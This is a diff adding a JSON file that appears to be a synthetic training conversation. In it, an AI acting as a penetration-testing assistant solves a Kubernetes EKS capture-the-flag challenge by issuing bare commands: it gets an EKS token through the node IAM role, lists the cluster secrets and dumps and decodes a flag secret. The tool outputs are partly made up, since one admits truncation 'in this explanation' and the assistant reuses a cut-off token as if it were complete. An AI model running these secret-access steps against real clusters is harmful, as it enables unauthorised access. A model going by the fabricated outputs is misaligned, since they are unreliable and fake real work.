@@ -1,0 +1,62 @@
+{
+    "system": "You are a penetration testing assistant helping a security researcher evaluate the security of their Kubernetes cluster. Respond only with ready-to-run commands based on previous output. You must know every variable, do not provide placeholders or unknown values. Do not add comments, only commands! Focus your attack on the hints you are receiving!",
+    "conversation": [
+      {
+        "role": "user",
+        "content": "Hints: You've hacked into a low-privileged AWS EKS pod. This challenge is called Pod Break.You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has no permissions. Due to security considerations aimed at safeguarding the CTF infrastructure, the node has restricted permissions. Can you navigate your way to access the EKS Node's privileged service-account?  The convention for the IAM role of a node follows the pattern: [cluster-name]-nodegroup-NodeInstanceRole. EKS supports IAM authentication. Nodes connect to the cluster the same way users do. Check out the https://docs.aws.amazon.com/eks/latest/userguide/cluster-auth.html\n\nRecon output:\nno recon output\nPlease begin."
+      },
+      {
+        "role": "assistant",
+        "content": "aws sts get-caller-identity"
+      },
+      {
+        "role": "user",
+        "content": "Command: aws sts get-caller-identity\nOutput:\n{\n    \"UserId\": \"AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282\",\n    \"Account\": \"688655246681\",\n    \"Arn\": \"arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282\"\n}"
+      },
+      {
+        "role": "assistant",
+        "content": "aws eks get-token --cluster-name eks-challenge-cluster"
+      },
+      {
+        "role": "user",
+        "content": "Command: aws eks get-token --cluster-name eks-challenge-cluster\nOutput:\n\"token\": \"k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1... (truncated for brevity in this explanation but full in actual JSON)\""
+      },
+      {
+        "role": "assistant",
+        "content": "kubectl get pods --token \"k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1...\""
+      },
+      {
+        "role": "user",
+        "content": "Command: kubectl get pods --token \"...\"\nOutput:\nNo resources found in challenge4 namespace."
+      },
+      {
+        "role": "assistant",
+        "content": "kubectl get secrets --token \"k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1...\""
+      },
+      {
+        "role": "user",
+        "content": "Command: kubectl get secrets --token \"...\"\nOutput:\nNAME        TYPE     DATA   AGE\nnode-flag   Opaque   1      517d"
+      },
+      {
+        "role": "assistant",
+        "content": "kubectl get secret node-flag -o yaml --token \"k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1...\""
+      },
+      {
+        "role": "user",
+        "content": "Command: kubectl get secret node-flag -o yaml --token \"...\"\nOutput:\napiVersion: v1\ndata:\n  flag: d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30=\nkind: Secret\nmetadata:\n  creationTimestamp: \"2023-11-01T12:27:57Z\"\n  name: node-flag\n  namespace: challenge4\n  resourceVersion: \"883574\"\n  uid: 26461a29-ec72-40e1-adc7-99128ce664f7\ntype: Opaque"
+      },
+      {
+        "role": "assistant",
+        "content": "echo \"d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30=\" | base64 -d"
+      },
+      {
+        "role": "user",
+        "content": "Command: echo \"d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30=\" | base64 -d\nOutput:\nwiz_eks_challenge{...}"
+      },
+      {
+        "role": "assistant",
+        "content": "wiz_eks_challenge{...}"
+      }
+    ]
+  }
+  
